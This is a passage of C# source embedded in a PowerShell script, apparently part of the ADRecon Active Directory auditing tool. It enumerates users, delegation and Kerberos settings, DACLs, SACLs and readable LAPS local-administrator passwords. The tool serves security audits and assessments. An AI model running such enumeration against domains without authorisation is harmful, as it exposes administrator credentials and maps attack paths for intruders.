                        PasswordStored = true;
                    }
                    catch //(Exception e)
                    {
                        //Console.WriteLine("{0} Exception caught.", e);
                    }
                    PSObject LAPSObj = new PSObject();
                    LAPSObj.Members.Add(new PSNoteProperty("Hostname", (AdComputer.Members["DNSHostName"].Value != null ? AdComputer.Members["DNSHostName"].Value : AdComputer.Members["CN"].Value )));
                    LAPSObj.Members.Add(new PSNoteProperty("Stored", PasswordStored));
                    LAPSObj.Members.Add(new PSNoteProperty("Readable", (AdComputer.Members["ms-Mcs-AdmPwd"].Value != null ? true : false)));
                    LAPSObj.Members.Add(new PSNoteProperty("Password", AdComputer.Members["ms-Mcs-AdmPwd"].Value));
                    LAPSObj.Members.Add(new PSNoteProperty("Expiration", CurrentExpiration));
                    return new PSObject[] { LAPSObj };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        class SIDRecordDictionaryProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    switch (Convert.ToString(AdObject.Members["ObjectClass"].Value))
                    {
                        case "user":
                        case "computer":
                        case "group":
                            ADWSClass.AdSIDDictionary.Add(Convert.ToString(AdObject.Members["objectsid"].Value), Convert.ToString(AdObject.Members["Name"].Value));
                            break;
                    }
                    return new PSObject[] { };
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} {1} Exception caught.", ((PSObject) record).Members["ObjectClass"].Value, e);
                    return new PSObject[] { };
                }
            }
        }

        class DACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    String Name = null;
                    String Type = null;
                    List<PSObject> DACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members["Name"].Value);

                    switch (Convert.ToString(AdObject.Members["objectClass"].Value))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Members["DisplayName"].Value);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members["objectClass"].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members["ntsecuritydescriptor"] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members["ntsecuritydescriptor"].Value;
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            String IdentityReference = Convert.ToString(Rule.IdentityReference);
                            String Owner = Convert.ToString(DirObjSec.GetOwner(typeof(System.Security.Principal.SecurityIdentifier)));
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("AccessControlType", Rule.AccessControlType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReferenceName", ADWSClass.AdSIDDictionary.ContainsKey(IdentityReference) ? ADWSClass.AdSIDDictionary[IdentityReference] : IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("OwnerName", ADWSClass.AdSIDDictionary.ContainsKey(Owner) ? ADWSClass.AdSIDDictionary[Owner] : Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("Owner", Owner));
                            ObjectObj.Members.Add(new PSNoteProperty("DistinguishedName", AdObject.Members["DistinguishedName"].Value));
                            DACLList.Add( ObjectObj );
                        }
                    }

                    return DACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

    class SACLRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    PSObject AdObject = (PSObject) record;
                    String Name = null;
                    String Type = null;
                    List<PSObject> SACLList = new List<PSObject>();

                    Name = Convert.ToString(AdObject.Members["Name"].Value);

                    switch (Convert.ToString(AdObject.Members["objectClass"].Value))
                    {
                        case "user":
                            Type = "User";
                            break;
                        case "computer":
                            Type = "Computer";
                            break;
                        case "group":
                            Type = "Group";
                            break;
                        case "container":
                            Type = "Container";
                            break;
                        case "groupPolicyContainer":
                            Type = "GPO";
                            Name = Convert.ToString(AdObject.Members["DisplayName"].Value);
                            break;
                        case "organizationalUnit":
                            Type = "OU";
                            break;
                        case "domainDNS":
                            Type = "Domain";
                            break;
                        default:
                            Type = Convert.ToString(AdObject.Members["objectClass"].Value);
                            break;
                    }

                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdObject.Members["ntsecuritydescriptor"] != null)
                    {
                        DirectoryObjectSecurity DirObjSec = (DirectoryObjectSecurity) AdObject.Members["ntsecuritydescriptor"].Value;
                        AuthorizationRuleCollection AuditRules = (AuthorizationRuleCollection) DirObjSec.GetAuditRules(true,true,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAuditRule Rule in AuditRules)
                        {
                            PSObject ObjectObj = new PSObject();
                            ObjectObj.Members.Add(new PSNoteProperty("Name", CleanString(Name)));
                            ObjectObj.Members.Add(new PSNoteProperty("Type", Type));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.ObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectTypeName", ADWSClass.GUIDs[Convert.ToString(Rule.InheritedObjectType)]));
                            ObjectObj.Members.Add(new PSNoteProperty("ActiveDirectoryRights", Rule.ActiveDirectoryRights));
                            ObjectObj.Members.Add(new PSNoteProperty("IdentityReference", Rule.IdentityReference));
                            ObjectObj.Members.Add(new PSNoteProperty("AuditFlags", Rule.AuditFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectFlags", Rule.ObjectFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceFlags", Rule.InheritanceFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritanceType", Rule.InheritanceType));
                            ObjectObj.Members.Add(new PSNoteProperty("Inherited", Rule.IsInherited));
                            ObjectObj.Members.Add(new PSNoteProperty("PropagationFlags", Rule.PropagationFlags));
                            ObjectObj.Members.Add(new PSNoteProperty("ObjectType", Rule.ObjectType));
                            ObjectObj.Members.Add(new PSNoteProperty("InheritedObjectType", Rule.InheritedObjectType));
                            SACLList.Add( ObjectObj );
                        }
                    }

                    return SACLList.ToArray();
                }
                catch (Exception e)
                {
                    Console.WriteLine("{0} Exception caught.", e);
                    return new PSObject[] { };
                }
            }
        }

        //The interface and implmentation class used to handle the results (this implementation just writes the strings to a file)

        interface IResultsHandler
        {
            void processResults(Object[] t);

            Object[] finalise();
        }

        class SimpleResultsHandler : IResultsHandler
        {
            private Object lockObj = new Object();
            private List<Object> processed = new List<Object>();

            public SimpleResultsHandler()
            {
            }

            public void processResults(Object[] results)
            {
                lock (lockObj)
                {
                    if (results.Length != 0)
                    {
                        for (var i = 0; i < results.Length; i++)
                        {
                            processed.Add((PSObject)results[i]);
                        }
                    }
                }
            }

            public Object[] finalise()
            {
                return processed.ToArray();
            }
        }
    }
}
"@

$LDAPSource = @"
// Thanks Dennis Albuquerque for the C# multithreading code
using System;
using System.Collections;
using System.Collections.Generic;
using System.Linq;
using System.Net;
using System.Threading;
using System.DirectoryServices;
using System.Security.Principal;
using System.Security.AccessControl;
using System.Management.Automation;

namespace ADRecon
{
    public static class LDAPClass
    {
        private static DateTime Date1;
        private static int PassMaxAge;
        private static int DormantTimeSpan;
        private static Dictionary<String, String> AdGroupDictionary = new Dictionary<String, String>();
        private static String DomainSID;
        private static Dictionary<String, String> AdGPODictionary = new Dictionary<String, String>();
        private static Hashtable GUIDs = new Hashtable();
        private static Dictionary<String, String> AdSIDDictionary = new Dictionary<String, String>();
        private static readonly HashSet<string> Groups = new HashSet<string> ( new String[] {"268435456", "268435457", "536870912", "536870913"} );
        private static readonly HashSet<string> Users = new HashSet<string> ( new String[] { "805306368" } );
        private static readonly HashSet<string> Computers = new HashSet<string> ( new String[] { "805306369" }) ;
        private static readonly HashSet<string> TrustAccounts = new HashSet<string> ( new String[] { "805306370" } );

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum UACFlags
        {
            SCRIPT = 1,        // 0x1
            ACCOUNTDISABLE = 2,        // 0x2
            HOMEDIR_REQUIRED = 8,        // 0x8
            LOCKOUT = 16,       // 0x10
            PASSWD_NOTREQD = 32,       // 0x20
            PASSWD_CANT_CHANGE = 64,       // 0x40
            ENCRYPTED_TEXT_PASSWORD_ALLOWED = 128,      // 0x80
            TEMP_DUPLICATE_ACCOUNT = 256,      // 0x100
            NORMAL_ACCOUNT = 512,      // 0x200
            INTERDOMAIN_TRUST_ACCOUNT = 2048,     // 0x800
            WORKSTATION_TRUST_ACCOUNT = 4096,     // 0x1000
            SERVER_TRUST_ACCOUNT = 8192,     // 0x2000
            DONT_EXPIRE_PASSWD = 65536,    // 0x10000
            MNS_LOGON_ACCOUNT = 131072,   // 0x20000
            SMARTCARD_REQUIRED = 262144,   // 0x40000
            TRUSTED_FOR_DELEGATION = 524288,   // 0x80000
            NOT_DELEGATED = 1048576,  // 0x100000
            USE_DES_KEY_ONLY = 2097152,  // 0x200000
            DONT_REQUIRE_PREAUTH = 4194304,  // 0x400000
            PASSWORD_EXPIRED = 8388608,  // 0x800000
            TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION = 16777216, // 0x1000000
            PARTIAL_SECRETS_ACCOUNT = 67108864 // 0x04000000
        }

        [Flags]
        //Values taken from https://blogs.msdn.microsoft.com/openspecification/2011/05/30/windows-configurations-for-kerberos-supported-encryption-type/
        public enum KerbEncFlags
        {
            ZERO = 0,
            DES_CBC_CRC = 1,        // 0x1
            DES_CBC_MD5 = 2,        // 0x2
            RC4_HMAC = 4,        // 0x4
            AES128_CTS_HMAC_SHA1_96 = 8,       // 0x18
            AES256_CTS_HMAC_SHA1_96 = 16       // 0x10
        }

        [Flags]
        //Values taken from https://support.microsoft.com/en-au/kb/305144
        public enum GroupTypeFlags
        {
            GLOBAL_GROUP       = 2,            // 0x00000002
            DOMAIN_LOCAL_GROUP = 4,            // 0x00000004
            LOCAL_GROUP        = 4,            // 0x00000004
            UNIVERSAL_GROUP    = 8,            // 0x00000008
            SECURITY_ENABLED   = -2147483648   // 0x80000000
        }

		private static readonly Dictionary<String, String> Replacements = new Dictionary<String, String>()
        {
            //{System.Environment.NewLine, ""},
            //{",", ";"},
            {"\"", "'"}
        };

        public static String CleanString(Object StringtoClean)
        {
            // Remove extra spaces and new lines
            String CleanedString = String.Join(" ", ((Convert.ToString(StringtoClean)).Split((string[]) null, StringSplitOptions.RemoveEmptyEntries)));
            foreach (String Replacement in Replacements.Keys)
            {
                CleanedString = CleanedString.Replace(Replacement, Replacements[Replacement]);
            }
            return CleanedString;
        }

        public static int ObjectCount(Object[] ADRObject)
        {
            return ADRObject.Length;
        }

        public static bool LAPSCheck(Object[] AdComputers)
        {
            bool LAPS = false;
            foreach (SearchResult AdComputer in AdComputers)
            {
                if (AdComputer.Properties["ms-mcs-admpwdexpirationtime"].Count == 1)
                {
                    LAPS = true;
                    return LAPS;
                }
            }
            return LAPS;
        }

        public static Object[] UserParser(Object[] AdUsers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "Users");
            return ADRObj;
        }

        public static Object[] UserSPNParser(Object[] AdUsers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdUsers, numOfThreads, "UserSPNs");
            return ADRObj;
        }

        public static Object[] GroupParser(Object[] AdGroups, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGroups, numOfThreads, "Groups");
            return ADRObj;
        }

        public static Object[] GroupMemberParser(Object[] AdGroups, Object[] AdGroupMembers, String DomainSID, int numOfThreads)
        {
            LDAPClass.AdGroupDictionary = new Dictionary<String, String>();
            runProcessor(AdGroups, numOfThreads, "GroupsDictionary");
            LDAPClass.DomainSID = DomainSID;
            Object[] ADRObj = runProcessor(AdGroupMembers, numOfThreads, "GroupMembers");
            return ADRObj;
        }

        public static Object[] OUParser(Object[] AdOUs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdOUs, numOfThreads, "OUs");
            return ADRObj;
        }

        public static Object[] GPOParser(Object[] AdGPOs, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdGPOs, numOfThreads, "GPOs");
            return ADRObj;
        }

        public static Object[] SOMParser(Object[] AdGPOs, Object[] AdSOMs, int numOfThreads)
        {
            LDAPClass.AdGPODictionary = new Dictionary<String, String>();
            runProcessor(AdGPOs, numOfThreads, "GPOsDictionary");
            Object[] ADRObj = runProcessor(AdSOMs, numOfThreads, "SOMs");
            return ADRObj;
        }

        public static Object[] PrinterParser(Object[] ADPrinters, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(ADPrinters, numOfThreads, "Printers");
            return ADRObj;
        }

        public static Object[] ComputerParser(Object[] AdComputers, DateTime Date1, int DormantTimeSpan, int PassMaxAge, int numOfThreads)
        {
            LDAPClass.Date1 = Date1;
            LDAPClass.DormantTimeSpan = DormantTimeSpan;
            LDAPClass.PassMaxAge = PassMaxAge;

            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "Computers");
            return ADRObj;
        }

        public static Object[] ComputerSPNParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "ComputerSPNs");
            return ADRObj;
        }

        public static Object[] LAPSParser(Object[] AdComputers, int numOfThreads)
        {
            Object[] ADRObj = runProcessor(AdComputers, numOfThreads, "LAPS");
            return ADRObj;
        }

        public static Object[] DACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.AdSIDDictionary = new Dictionary<String, String>();
            runProcessor(ADObjects, numOfThreads, "SIDDictionary");
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "DACLs");
            return ADRObj;
        }

        public static Object[] SACLParser(Object[] ADObjects, Object PSGUIDs, int numOfThreads)
        {
            LDAPClass.GUIDs = (Hashtable) PSGUIDs;
            Object[] ADRObj = runProcessor(ADObjects, numOfThreads, "SACLs");
            return ADRObj;
        }

        static Object[] runProcessor(Object[] arrayToProcess, int numOfThreads, string processorType)
        {
            int totalRecords = arrayToProcess.Length;
            IRecordProcessor recordProcessor = recordProcessorFactory(processorType);
            IResultsHandler resultsHandler = new SimpleResultsHandler ();
            int numberOfRecordsPerThread = totalRecords / numOfThreads;
            int remainders = totalRecords % numOfThreads;

            Thread[] threads = new Thread[numOfThreads];
            for (int i = 0; i < numOfThreads; i++)
            {
                int numberOfRecordsToProcess = numberOfRecordsPerThread;
                if (i == (numOfThreads - 1))
                {
                    //last thread, do the remaining records
                    numberOfRecordsToProcess += remainders;
                }

                //split the full array into chunks to be given to different threads
                Object[] sliceToProcess = new Object[numberOfRecordsToProcess];
                Array.Copy(arrayToProcess, i * numberOfRecordsPerThread, sliceToProcess, 0, numberOfRecordsToProcess);
                ProcessorThread processorThread = new ProcessorThread(i, recordProcessor, resultsHandler, sliceToProcess);
                threads[i] = new Thread(processorThread.processThreadRecords);
                threads[i].Start();
            }
            foreach (Thread t in threads)
            {
                t.Join();
            }

            return resultsHandler.finalise();
        }

        static IRecordProcessor recordProcessorFactory(String name)
        {
            switch (name)
            {
                case "Users":
                    return new UserRecordProcessor();
                case "UserSPNs":
                    return new UserSPNRecordProcessor();
                case "Groups":
                    return new GroupRecordProcessor();
                case "GroupsDictionary":
                    return new GroupRecordDictionaryProcessor();
                case "GroupMembers":
                    return new GroupMemberRecordProcessor();
                case "OUs":
                    return new OURecordProcessor();
                case "GPOs":
                    return new GPORecordProcessor();
                case "GPOsDictionary":
                    return new GPORecordDictionaryProcessor();
                case "SOMs":
                    return new SOMRecordProcessor();
                case "Printers":
                    return new PrinterRecordProcessor();
                case "Computers":
                    return new ComputerRecordProcessor();
                case "ComputerSPNs":
                    return new ComputerSPNRecordProcessor();
                case "LAPS":
                    return new LAPSRecordProcessor();
                case "SIDDictionary":
                    return new SIDRecordDictionaryProcessor();
                case "DACLs":
                    return new DACLRecordProcessor();
                case "SACLs":
                    return new SACLRecordProcessor();
            }
            throw new ArgumentException("Invalid processor type " + name);
        }

        class ProcessorThread
        {
            readonly int id;
            readonly IRecordProcessor recordProcessor;
            readonly IResultsHandler resultsHandler;
            readonly Object[] objectsToBeProcessed;

            public ProcessorThread(int id, IRecordProcessor recordProcessor, IResultsHandler resultsHandler, Object[] objectsToBeProcessed)
            {
                this.recordProcessor = recordProcessor;
                this.id = id;
                this.resultsHandler = resultsHandler;
                this.objectsToBeProcessed = objectsToBeProcessed;
            }

            public void processThreadRecords()
            {
                for (int i = 0; i < objectsToBeProcessed.Length; i++)
                {
                    Object[] result = recordProcessor.processRecord(objectsToBeProcessed[i]);
                    resultsHandler.processResults(result); //this is a thread safe operation
                }
            }
        }

        //The interface and implmentation class used to process a record (this implemmentation just returns a log type string)

        interface IRecordProcessor
        {
            PSObject[] processRecord(Object record);
        }

        class UserRecordProcessor : IRecordProcessor
        {
            public PSObject[] processRecord(Object record)
            {
                try
                {
                    SearchResult AdUser = (SearchResult) record;
                    bool? Enabled = null;
                    bool? CannotChangePassword = null;
                    bool? PasswordNeverExpires = null;
                    bool? AccountLockedOut = null;
                    bool? PasswordExpired = null;
                    bool? ReversiblePasswordEncryption = null;
                    bool? DelegationPermitted = null;
                    bool? SmartcardRequired = null;
                    bool? UseDESKeyOnly = null;
                    bool? PasswordNotRequired = null;
                    bool? TrustedforDelegation = null;
                    bool? TrustedtoAuthforDelegation = null;
                    bool? DoesNotRequirePreAuth = null;
                    bool? KerberosRC4 = null;
                    bool? KerberosAES128 = null;
                    bool? KerberosAES256 = null;
                    String DelegationType = null;
                    String DelegationProtocol = null;
                    String DelegationServices = null;
                    bool MustChangePasswordatLogon = false;
                    int? DaysSinceLastLogon = null;
                    int? DaysSinceLastPasswordChange = null;
                    int? AccountExpirationNumofDays = null;
                    bool PasswordNotChangedafterMaxAge = false;
                    bool NeverLoggedIn = false;
                    bool Dormant = false;
                    DateTime? LastLogonDate = null;
                    DateTime? PasswordLastSet = null;
                    DateTime? AccountExpires = null;
                    byte[] ntSecurityDescriptor = null;
                    bool DenyEveryone = false;
                    bool DenySelf = false;
                    String SIDHistory = "";

                    // When the user is not allowed to query the UserAccountControl attribute.
                    if (AdUser.Properties["useraccountcontrol"].Count != 0)
                    {
                        var userFlags = (UACFlags) AdUser.Properties["useraccountcontrol"][0];
                        Enabled = !((userFlags & UACFlags.ACCOUNTDISABLE) == UACFlags.ACCOUNTDISABLE);
                        PasswordNeverExpires = (userFlags & UACFlags.DONT_EXPIRE_PASSWD) == UACFlags.DONT_EXPIRE_PASSWD;
                        AccountLockedOut = (userFlags & UACFlags.LOCKOUT) == UACFlags.LOCKOUT;
                        DelegationPermitted = !((userFlags & UACFlags.NOT_DELEGATED) == UACFlags.NOT_DELEGATED);
                        SmartcardRequired = (userFlags & UACFlags.SMARTCARD_REQUIRED) == UACFlags.SMARTCARD_REQUIRED;
                        ReversiblePasswordEncryption = (userFlags & UACFlags.ENCRYPTED_TEXT_PASSWORD_ALLOWED) == UACFlags.ENCRYPTED_TEXT_PASSWORD_ALLOWED;
                        UseDESKeyOnly = (userFlags & UACFlags.USE_DES_KEY_ONLY) == UACFlags.USE_DES_KEY_ONLY;
                        PasswordNotRequired = (userFlags & UACFlags.PASSWD_NOTREQD) == UACFlags.PASSWD_NOTREQD;
                        PasswordExpired = (userFlags & UACFlags.PASSWORD_EXPIRED) == UACFlags.PASSWORD_EXPIRED;
                        TrustedforDelegation = (userFlags & UACFlags.TRUSTED_FOR_DELEGATION) == UACFlags.TRUSTED_FOR_DELEGATION;
                        TrustedtoAuthforDelegation = (userFlags & UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION) == UACFlags.TRUSTED_TO_AUTHENTICATE_FOR_DELEGATION;
                        DoesNotRequirePreAuth = (userFlags & UACFlags.DONT_REQUIRE_PREAUTH) == UACFlags.DONT_REQUIRE_PREAUTH;
                    }
                    if (AdUser.Properties["msds-supportedencryptiontypes"].Count != 0)
                    {
                        var userKerbEncFlags = (KerbEncFlags) AdUser.Properties["msds-supportedencryptiontypes"][0];
                        if (userKerbEncFlags != KerbEncFlags.ZERO)
                        {
                            KerberosRC4 = (userKerbEncFlags & KerbEncFlags.RC4_HMAC) == KerbEncFlags.RC4_HMAC;
                            KerberosAES128 = (userKerbEncFlags & KerbEncFlags.AES128_CTS_HMAC_SHA1_96) == KerbEncFlags.AES128_CTS_HMAC_SHA1_96;
                            KerberosAES256 = (userKerbEncFlags & KerbEncFlags.AES256_CTS_HMAC_SHA1_96) == KerbEncFlags.AES256_CTS_HMAC_SHA1_96;
                        }
                    }
                    // When the user is not allowed to query the ntsecuritydescriptor attribute.
                    if (AdUser.Properties["ntsecuritydescriptor"].Count != 0)
                    {
                        ntSecurityDescriptor = (byte[]) AdUser.Properties["ntsecuritydescriptor"][0];
                    }
                    else
                    {
                        DirectoryEntry AdUserEntry = ((SearchResult)record).GetDirectoryEntry();
                        ntSecurityDescriptor = (byte[]) AdUserEntry.ObjectSecurity.GetSecurityDescriptorBinaryForm();
                    }
                    if (ntSecurityDescriptor != null)
                    {
                        DirectoryObjectSecurity DirObjSec = new ActiveDirectorySecurity();
                        DirObjSec.SetSecurityDescriptorBinaryForm(ntSecurityDescriptor);
                        AuthorizationRuleCollection AccessRules = (AuthorizationRuleCollection) DirObjSec.GetAccessRules(true,false,typeof(System.Security.Principal.NTAccount));
                        foreach (ActiveDirectoryAccessRule Rule in AccessRules)
                        {
                            if ((Convert.ToString(Rule.ObjectType)).Equals("ab721a53-1e2f-11d0-9819-00aa0040529b"))
                            {
                                if (Rule.AccessControlType.ToString() == "Deny")
                                {
                                    String ObjectName = Convert.ToString(Rule.IdentityReference);
                                    if (ObjectName == "Everyone")
                                    {
                                        DenyEveryone = true;
                                    }
                                    if (ObjectName == "NT AUTHORITY\\SELF")
                                    {
                                        DenySelf = true;
                                    }
                                }
                            }
                        }
                        if (DenyEveryone && DenySelf)
                        {
                            CannotChangePassword = true;
                        }
                        else
                        {
                            CannotChangePassword = false;
                        }
                    }
                    if (AdUser.Properties["lastlogontimestamp"].Count != 0)
                    {
                        LastLogonDate = DateTime.FromFileTime((long)(AdUser.Properties["lastlogontimestamp"][0]));
                        DaysSinceLastLogon = Math.Abs((Date1 - (DateTime)LastLogonDate).Days);
                        if (DaysSinceLastLogon > DormantTimeSpan)
                        {
                            Dormant = true;
                        }
                    }
                    else
                    {
                        NeverLoggedIn = true;
                    }
                    if (AdUser.Properties["pwdLastSet"].Count != 0)
                    {
                        if (Convert.ToString(AdUser.Properties["pwdlastset"][0]) == "0")
                        {
                            if ((bool) PasswordNeverExpires == false)
                            {
                                MustChangePasswordatLogon = true;
                            }
                        }
                        else
                        {
                            PasswordLastSet = DateTime.FromFileTime((long)(AdUser.Properties["pwdlastset"][0]));
                            DaysSinceLastPasswordChange = Math.Abs((Date1 - (DateTime)PasswordLastSet).Days);
                            if (DaysSinceLastPasswordChange > PassMaxAge)
                            {
                                PasswordNotChangedafterMaxAge = true;
                            }
                        }
                    }
                    if ((Int64) AdUser.Properties["accountExpires"][0] != (Int64) 9223372036854775807)
                    {
                        if ((Int64) AdUser.Properties["accountExpires"][0] != (Int64) 0)
                        {
                            try
                            {
                                //https://msdn.microsoft.com/en-us/library/ms675098(v=vs.85).aspx
                                AccountExpires = DateTime.FromFileTime((long)(AdUser.Properties["accountExpires"][0]));
                                AccountExpirationNumofDays = ((int)((DateTime)AccountExpires - Date1).Days);

                            }
                            catch //(Exception e)
                            {
                                //    Console.WriteLine("{0} Exception caught.", e);
                            }
                        }
                    }
                    if ((bool) TrustedforDelegation)
                    {
                        DelegationType = "Unconstrained";
                        DelegationServices = "Any";
                    }
                    if (AdUser.Properties["msDS-AllowedToDelegateTo"].Count >= 1)
                    {
                        DelegationType = "Constrained";
                        for (int i = 0; i < AdUser.Properties["msDS-AllowedToDelegateTo"].Count; i++)
                        {
                            var delegateto = AdUser.Properties["msDS-AllowedToDelegateTo"][i];
                            DelegationServices = DelegationServices + "," + Convert.ToString(delegateto);
                        }
                        DelegationServices = DelegationServices.TrimStart(',');
                    }
                    if ((bool) TrustedtoAuthforDelegation)
                    {
                        DelegationProtocol = "Any";
                    }
                    else if (DelegationType != null)
                    {
                        DelegationProtocol = "Kerberos";
                    }
                    if (AdUser.Properties["sidhistory"].Count >= 1)
                    {
                        string sids = "";
                        for (int i = 0; i < AdUser.Properties["sidhistory"].Count; i++)
                        {
                            var history = AdUser.Properties["sidhistory"][i];
                            sids = sids + "," + Convert.ToString(new SecurityIdentifier((byte[])history, 0));
                        }
                        SIDHistory = sids.TrimStart(',');
                    }

                    PSObject UserObj = new PSObject();
                    UserObj.Members.Add(new PSNoteProperty("UserName", (AdUser.Properties["samaccountname"].Count != 0 ? AdUser.Properties["samaccountname"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("Name", (AdUser.Properties["name"].Count != 0 ? CleanString(AdUser.Properties["name"][0]) : "")));
                    UserObj.Members.Add(new PSNoteProperty("Enabled", Enabled));
                    UserObj.Members.Add(new PSNoteProperty("Must Change Password at Logon", MustChangePasswordatLogon));
                    UserObj.Members.Add(new PSNoteProperty("Cannot Change Password", CannotChangePassword));
                    UserObj.Members.Add(new PSNoteProperty("Password Never Expires", PasswordNeverExpires));
                    UserObj.Members.Add(new PSNoteProperty("Reversible Password Encryption", ReversiblePasswordEncryption));
                    UserObj.Members.Add(new PSNoteProperty("Smartcard Logon Required", SmartcardRequired));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Permitted", DelegationPermitted));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos DES Only", UseDESKeyOnly));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos RC4", KerberosRC4));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-128bit", KerberosAES128));
                    UserObj.Members.Add(new PSNoteProperty("Kerberos AES-256bit", KerberosAES256));
                    UserObj.Members.Add(new PSNoteProperty("Does Not Require Pre Auth", DoesNotRequirePreAuth));
                    UserObj.Members.Add(new PSNoteProperty("Never Logged in", NeverLoggedIn));
                    UserObj.Members.Add(new PSNoteProperty("Logon Age (days)", DaysSinceLastLogon));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (days)", DaysSinceLastPasswordChange));
                    UserObj.Members.Add(new PSNoteProperty("Dormant (> " + DormantTimeSpan + " days)", Dormant));
                    UserObj.Members.Add(new PSNoteProperty("Password Age (> " + PassMaxAge + " days)", PasswordNotChangedafterMaxAge));
                    UserObj.Members.Add(new PSNoteProperty("Account Locked Out", AccountLockedOut));
                    UserObj.Members.Add(new PSNoteProperty("Password Expired", PasswordExpired));
                    UserObj.Members.Add(new PSNoteProperty("Password Not Required", PasswordNotRequired));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Type", DelegationType));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Protocol", DelegationProtocol));
                    UserObj.Members.Add(new PSNoteProperty("Delegation Services", DelegationServices));
                    UserObj.Members.Add(new PSNoteProperty("Logon Workstations", (AdUser.Properties["userworkstations"].Count != 0 ? AdUser.Properties["userworkstations"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("AdminCount", (AdUser.Properties["admincount"].Count != 0 ? AdUser.Properties["admincount"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("Primary GroupID", (AdUser.Properties["primarygroupid"].Count != 0 ? AdUser.Properties["primarygroupid"][0] : "")));
                    UserObj.Members.Add(new PSNoteProperty("SID", Convert.ToString(new SecurityIdentifier((byte[])AdUser.Properties["objectSID"][0], 0))));
                    UserObj.Members.Add(new PSNoteProperty("SIDHistory", SIDHistory));
                    UserObj.Members.Add(new PSNoteProperty("Description", (AdUser.Properties["Description"].Count != 0 ? CleanString(AdUser.Properties["Description"][0]) : "")));
